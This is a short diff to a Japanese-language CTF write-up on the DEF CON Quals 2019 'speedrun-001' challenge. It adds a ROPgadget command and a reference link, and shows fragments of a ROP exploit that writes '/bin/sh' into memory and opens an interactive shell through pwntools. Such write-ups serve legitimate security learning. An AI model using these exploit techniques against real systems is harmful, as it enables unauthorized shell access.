@@ -110,6 +110,7 @@ http://inaz2.hatenablog.com/entry/2014/03/26/014509
 
 次にメモリ上のどこかに`/bin/sh/\00`を書き込こむ為の場所を探します.
 ```
+$ROPgadget --binary speedrun-001.dms > out
 $less out
 ...
 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
@@ -180,4 +181,6 @@ p.sendline(payload)
 p.interactive()
 ```
 
-ローカル環境で正常に作動したので, リモートエクスプロイトは可能だと思います. ただ私の環境不備のせいか繋がらなかったです.
+### 参考
+
+https://github.com/guyinatuxedo/ctf/tree/master/defconquals2019/speedrun/s1
